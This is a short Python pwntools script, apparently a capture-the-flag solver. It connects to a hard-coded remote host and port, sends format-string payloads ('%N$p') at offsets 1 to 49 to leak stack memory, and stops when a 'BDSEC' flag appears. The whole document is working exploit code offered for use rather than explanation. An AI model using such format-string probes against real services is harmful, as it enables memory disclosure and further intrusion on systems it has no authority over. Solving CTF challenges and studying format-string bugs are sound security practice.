from pwn import *

host = "45.33.118.86"
port = 9992

for i in range(1, 50):
    try:
        print(f"[*] Trying offset {i} ...")
        conn = remote(host, port)
        conn.recvuntil(b"Enter your input: ")

        payload = f"%{i}$p"
        conn.sendline(payload)
        
        res = conn.recvall(timeout=2).decode(errors="ignore")
        print(f"[+] Offset {i} result:\n{res}\n")
        
        if "BDSEC" in res:
            print("[🎉] Flag found!")
            break

        conn.close()
    except Exception as e:
        print(f"[!] Error at offset {i}: {e}")
